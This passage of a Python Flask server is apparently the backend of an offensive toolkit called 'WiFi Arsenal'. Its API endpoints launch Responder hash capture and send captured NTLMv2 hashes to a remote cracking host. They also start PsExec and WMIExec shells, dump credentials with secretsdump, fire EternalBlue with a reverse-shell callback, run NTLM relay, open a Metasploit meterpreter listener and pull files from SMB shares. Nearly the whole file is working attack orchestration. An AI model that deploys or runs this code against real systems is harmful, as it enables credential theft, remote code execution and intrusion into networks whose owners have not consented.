def internal_responder_start():
    """Start Responder for hash capture"""
    data = request.json or {}
    interface = data.get('interface', 'alfa0')

    if not re.match(r'^[a-zA-Z0-9]+$', interface):
        return jsonify({'success': False, 'error': 'Invalid interface name'})

    script = os.path.join(SCRIPT_DIR, 'internal', 'start_responder.sh')
    try:
        result = subprocess.run(['bash', script, interface],
                              capture_output=True, text=True, timeout=10)
        success = 'started' in result.stdout.lower()
        return jsonify({
            'success': success,
            'output': result.stdout + result.stderr
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@app.route('/api/internal/responder/stop', methods=['POST'])
def internal_responder_stop():
    """Stop Responder"""
    script = os.path.join(SCRIPT_DIR, 'internal', 'stop_responder.sh')
    try:
        result = subprocess.run(['bash', script], 
                              capture_output=True, text=True, timeout=10)
        return jsonify({
            'success': True,
            'output': result.stdout + result.stderr
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@app.route('/api/internal/responder/status', methods=['GET'])
def internal_responder_status():
    """Get Responder status"""
    pid_file = '/tmp/responder_pid.txt'
    running = False
    pid = None
    
    if os.path.exists(pid_file):
        with open(pid_file, 'r') as f:
            pid = f.read().strip()
        try:
            os.kill(int(pid), 0)
            running = True
        except:
            running = False
    
    # Count hashes
    hash_count = 0
    hash_file = os.path.join(CAPTURE_DIR, 'hashes', 'hashes.json')
    if os.path.exists(hash_file):
        try:
            with open(hash_file, 'r') as f:
                hashes = json.load(f)
                hash_count = len(hashes)
        except:
            pass
    
    return jsonify({
        'running': running,
        'pid': pid,
        'hash_count': hash_count
    })


@app.route('/api/internal/hashes', methods=['GET'])
def internal_get_hashes():
    """Get captured hashes"""
    hash_file = os.path.join(CAPTURE_DIR, 'hashes', 'hashes.json')
    
    if os.path.exists(hash_file):
        try:
            with open(hash_file, 'r') as f:
                hashes = json.load(f)
            return jsonify({
                'success': True,
                'hashes': hashes
            })
        except Exception as e:
            return jsonify({'success': False, 'error': str(e)})
    else:
        return jsonify({
            'success': True,
            'hashes': []
        })


@app.route('/api/internal/hashes/send-to-glass', methods=['POST'])
def internal_send_hash_to_glass():
    """Send a hash to Glass for cracking"""
    data = request.json or {}
    hash_string = data.get('hash', '')

    if not hash_string:
        return jsonify({'success': False, 'error': 'No hash provided'})

    # Save hash to file for Glass — use ntlmv2_ prefix so Glass knows it's mode 5600
    filename = f'ntlmv2_{int(time.time())}.txt'
    hash_file = os.path.join(CAPTURE_DIR, 'hashes', filename)
    try:
        with open(hash_file, 'w') as f:
            f.write(hash_string)

        # Upload to Glass for cracking (tries LAN first, falls back to Cloudflare Tunnel)
        glass_uploaded = False
        glass_message = ''
        try:
            with open(hash_file, 'rb') as f:
                file_data = f.read()
            files = {'file': (filename, file_data, 'application/octet-stream')}
            response = try_glass_request('post', '/upload', files=files)
            if response.status_code == 200:
                glass_uploaded = True
                glass_message = 'Hash uploaded to Glass for cracking'
            else:
                glass_message = f'Glass upload returned status {response.status_code} — hash saved locally'
        except Exception as glass_err:
            glass_message = f'Glass unreachable ({str(glass_err)}) — hash saved locally for manual transfer'

        return jsonify({
            'success': True,
            'glass_uploaded': glass_uploaded,
            'message': glass_message,
            'file': hash_file
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})



# ============== EXPLOITATION ENDPOINTS ==============

@app.route('/api/internal/exploit/psexec', methods=['POST'])
def internal_psexec():
    """Get shell via PsExec"""
    data = request.json or {}
    target = data.get('target')
    user = data.get('user')
    password = data.get('password')
    domain = data.get('domain', 'WORKGROUP')

    if not all([target, user, password]):
        return jsonify({'success': False, 'error': 'Missing target, user, or password'})

    if not re.match(r'^[0-9a-fA-F.:]+$', target):
        return jsonify({'success': False, 'error': 'Invalid target IP format'})

    script = os.path.join(SCRIPT_DIR, 'internal', 'psexec_shell.sh')
    try:
        # Run in background, return immediately
        subprocess.Popen(['bash', script, target, user, password, domain],
                        stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return jsonify({
            'success': True,
            'message': f'PsExec started against {target}'
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@app.route('/api/internal/exploit/wmiexec', methods=['POST'])
def internal_wmiexec():
    """Get shell via WMIExec"""
    data = request.json or {}
    target = data.get('target')
    user = data.get('user')
    password = data.get('password')
    domain = data.get('domain', 'WORKGROUP')

    if not all([target, user, password]):
        return jsonify({'success': False, 'error': 'Missing target, user, or password'})

    if not re.match(r'^[0-9a-fA-F.:]+$', target):
        return jsonify({'success': False, 'error': 'Invalid target IP format'})

    script = os.path.join(SCRIPT_DIR, 'internal', 'wmiexec_shell.sh')
    try:
        subprocess.Popen(['bash', script, target, user, password, domain],
                        stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return jsonify({
            'success': True,
            'message': f'WMIExec started against {target}'
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@app.route('/api/internal/exploit/secretsdump', methods=['POST'])
def internal_secretsdump():
    """Dump credentials from target"""
    data = request.json or {}
    target = data.get('target')
    user = data.get('user')
    password = data.get('password')
    domain = data.get('domain', 'WORKGROUP')

    if not all([target, user, password]):
        return jsonify({'success': False, 'error': 'Missing target, user, or password'})

    if not re.match(r'^[0-9a-fA-F.:]+$', target):
        return jsonify({'success': False, 'error': 'Invalid target IP format'})

    script = os.path.join(SCRIPT_DIR, 'internal', 'secretsdump.sh')
    try:
        result = subprocess.run(['bash', script, target, user, password, domain],
                              capture_output=True, text=True, timeout=120)
        return jsonify({
            'success': True,
            'output': result.stdout + result.stderr
        })
    except subprocess.TimeoutExpired:
        return jsonify({'success': False, 'error': 'Timeout - target may be unreachable'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@app.route('/api/internal/exploit/eternalblue', methods=['POST'])
def internal_eternalblue():
    """Launch EternalBlue exploit"""
    data = request.json or {}
    target = data.get('target')
    lhost = data.get('lhost', '10.0.0.1')
    lport = data.get('lport', '4444')

    if not target:
        return jsonify({'success': False, 'error': 'Missing target'})

    if not re.match(r'^[0-9a-fA-F.:]+$', target):
        return jsonify({'success': False, 'error': 'Invalid target IP format'})
    if not re.match(r'^[0-9a-fA-F.:]+$', lhost):
        return jsonify({'success': False, 'error': 'Invalid lhost format'})
    if not re.match(r'^[0-9]+$', str(lport)):
        return jsonify({'success': False, 'error': 'Invalid lport format'})

    script = os.path.join(SCRIPT_DIR, 'internal', 'start_eternalblue.sh')
    try:
        subprocess.Popen(['bash', script, target, lhost, str(lport)],
                        stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return jsonify({
            'success': True,
            'message': f'EternalBlue launched against {target}, callback {lhost}:{lport}'
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@app.route('/api/internal/exploit/relay/start', methods=['POST'])
def internal_relay_start():
    """Start NTLM relay attack"""
    data = request.json or {}
    target = data.get('target')
    interface = data.get('interface', 'alfa0')

    if not target:
        return jsonify({'success': False, 'error': 'Missing relay target'})

    if not re.match(r'^[0-9a-fA-F.:]+$', target):
        return jsonify({'success': False, 'error': 'Invalid target IP format'})
    if not re.match(r'^[a-zA-Z0-9]+$', interface):
        return jsonify({'success': False, 'error': 'Invalid interface name'})

    script = os.path.join(SCRIPT_DIR, 'internal', 'ntlmrelay.sh')
    try:
        result = subprocess.run(['bash', script, target, interface],
                              capture_output=True, text=True, timeout=10)
        success = 'started' in result.stdout.lower()
        return jsonify({
            'success': success,
            'output': result.stdout + result.stderr
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@app.route('/api/internal/exploit/relay/stop', methods=['POST'])
def internal_relay_stop():
    """Stop NTLM relay"""
    pid_file = '/tmp/ntlmrelay_pid.txt'
    try:
        if os.path.exists(pid_file):
            with open(pid_file, 'r') as f:
                pid = f.read().strip()
            if pid.isdigit():
                os.kill(int(pid), signal.SIGTERM)
                time.sleep(0.5)
                try:
                    os.kill(int(pid), signal.SIGKILL)
                except ProcessLookupError:
                    pass
            os.remove(pid_file)
        subprocess.run(['pkill', '-f', 'ntlmrelayx'], capture_output=True)
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@app.route('/api/internal/listener/start', methods=['POST'])
def internal_listener_start():
    """Start Metasploit listener"""
    data = request.json or {}
    lhost = data.get('lhost', '0.0.0.0')
    lport = data.get('lport', '4444')
    payload = data.get('payload', 'windows/x64/meterpreter/reverse_tcp')

    if not re.match(r'^[0-9a-fA-F.:]+$', lhost):
        return jsonify({'success': False, 'error': 'Invalid lhost format'})
    if not re.match(r'^[0-9]+$', str(lport)):
        return jsonify({'success': False, 'error': 'Invalid lport format'})
    if not re.match(r'^[a-zA-Z0-9_/]+$', payload):
        return jsonify({'success': False, 'error': 'Invalid payload format'})

    script = os.path.join(SCRIPT_DIR, 'internal', 'start_listener.sh')
    try:
        result = subprocess.run(['bash', script, lhost, str(lport), payload],
                              capture_output=True, text=True, timeout=10)
        success = 'started' in result.stdout.lower()
        return jsonify({
            'success': success,
            'output': result.stdout + result.stderr
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@app.route('/api/internal/listener/stop', methods=['POST'])
def internal_listener_stop():
    """Stop Metasploit listener"""
    try:
        subprocess.run(['screen', '-X', '-S', 'msf_listener', 'quit'], capture_output=True)
        subprocess.run(['pkill', '-f', 'msfconsole'], capture_output=True)
        if os.path.exists('/tmp/msf_listener_pid.txt'):
            os.remove('/tmp/msf_listener_pid.txt')
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


# ============== ACCESS ENDPOINTS ==============

@app.route('/api/internal/access/smb/list', methods=['POST'])
def internal_smb_list():
    """List SMB shares on target"""
    data = request.json or {}
    target = data.get('target')
    user = data.get('user', '')
    password = data.get('password', '')
    domain = data.get('domain', 'WORKGROUP')

    if not target:
        return jsonify({'success': False, 'error': 'Missing target'})

    if not re.match(r'^[0-9a-fA-F.:]+$', target):
        return jsonify({'success': False, 'error': 'Invalid target IP format'})

    script = os.path.join(SCRIPT_DIR, 'internal', 'smb_list.sh')
    try:
        result = subprocess.run(['bash', script, target, user, password, domain],
                              capture_output=True, text=True, timeout=30)
        return jsonify({
            'success': True,
            'output': result.stdout + result.stderr
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@app.route('/api/internal/access/smb/download', methods=['POST'])
def internal_smb_download():
    """Download file from SMB share"""
    data = request.json or {}
    target = data.get('target')
    share = data.get('share')
    path = data.get('path')
    user = data.get('user', '')
    password = data.get('password', '')
    domain = data.get('domain', 'WORKGROUP')

    if not all([target, share, path]):
        return jsonify({'success': False, 'error': 'Missing target, share, or path'})

    if not re.match(r'^[0-9a-fA-F.:]+$', target):
        return jsonify({'success': False, 'error': 'Invalid target IP format'})

    script = os.path.join(SCRIPT_DIR, 'internal', 'smb_download.sh')
    try:
        result = subprocess.run(['bash', script, target, share, path, user, password, domain],
                              capture_output=True, text=True, timeout=60)

        # Verify downloaded file stays within captures directory
        output_dir = os.path.join(CAPTURE_DIR, 'evidence', target)
        if os.path.exists(output_dir):
            for f in os.listdir(output_dir):
                fpath = os.path.realpath(os.path.join(output_dir, f))
                if not fpath.startswith(os.path.realpath(CAPTURE_DIR)):
                    os.remove(fpath)
                    return jsonify({'success': False, 'error': 'Downloaded file path violation'})

        success = 'Downloaded' in result.stdout
        return jsonify({
            'success': success,
            'output': result.stdout + result.stderr
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


# ============== EVIDENCE ENDPOINTS ==============

@app.route('/api/internal/evidence', methods=['GET'])
def internal_evidence_list():
    """List all captured evidence"""
    evidence_dir = os.path.join(CAPTURE_DIR, 'evidence')
    evidence = {}
    
    if os.path.exists(evidence_dir):
        for target_dir in os.listdir(evidence_dir):
            target_path = os.path.join(evidence_dir, target_dir)
            if os.path.isdir(target_path):
                files = []
                for f in os.listdir(target_path):
                    file_path = os.path.join(target_path, f)
                    files.append({
                        'name': f,
                        'size': os.path.getsize(file_path),
                        'modified': datetime.fromtimestamp(os.path.getmtime(file_path)).isoformat()
                    })
                evidence[target_dir] = files
    
    return jsonify({
        'success': True,
        'evidence': evidence
    })


@app.route('/api/internal/evidence/<target>/<filename>', methods=['GET'])
def internal_evidence_download(target, filename):
    """Download evidence file"""
    evidence_base = os.path.realpath(os.path.join(CAPTURE_DIR, 'evidence'))
    evidence_dir = os.path.join(CAPTURE_DIR, 'evidence', target)
    file_path = os.path.realpath(os.path.join(evidence_dir, filename))

    # Prevent path traversal
    if not file_path.startswith(evidence_base + os.sep):
        return jsonify({'success': False, 'error': 'Access denied'}), 403

    if os.path.exists(file_path):
        return send_file(file_path, as_attachment=True)
    else:
        return jsonify({'success': False, 'error': 'File not found'}), 404


@app.route('/api/internal/evidence/export', methods=['GET'])
def internal_evidence_export():
    """Export all evidence as ZIP"""
    import zipfile
    from io import BytesIO

    evidence_dir = os.path.realpath(os.path.join(CAPTURE_DIR, 'evidence'))

    if not os.path.exists(evidence_dir):
        return jsonify({'success': False, 'error': 'No evidence collected'})

    # Create ZIP in memory
    memory_file = BytesIO()
    with zipfile.ZipFile(memory_file, 'w', zipfile.ZIP_DEFLATED) as zf:
        for root, dirs, files in os.walk(evidence_dir):
            for file in files:
                file_path = os.path.realpath(os.path.join(root, file))
                # Skip any symlinks or paths that escape evidence directory
                if not file_path.startswith(evidence_dir + os.sep):
                    continue
                arcname = os.path.relpath(file_path, evidence_dir)
                zf.write(file_path, arcname)
    
    memory_file.seek(0)
    
    timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
    return send_file(
        memory_file,
        mimetype='application/zip',
        as_attachment=True,
        download_name=f'evidence_export_{timestamp}.zip'
    )

if __name__ == '__main__':
    # Ensure capture directories exist
    os.makedirs(CAPTURE_DIR, exist_ok=True)
    os.makedirs(os.path.join(CAPTURE_DIR, 'handshakes'), exist_ok=True)
    os.makedirs(os.path.join(CAPTURE_DIR, 'pmkid'), exist_ok=True)
    os.makedirs(os.path.join(CAPTURE_DIR, 'hashes'), exist_ok=True)
    os.makedirs(os.path.join(CAPTURE_DIR, 'wardrive'), exist_ok=True)
    
    print("[*] WiFi Arsenal Server starting on http://0.0.0.0:5000")
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
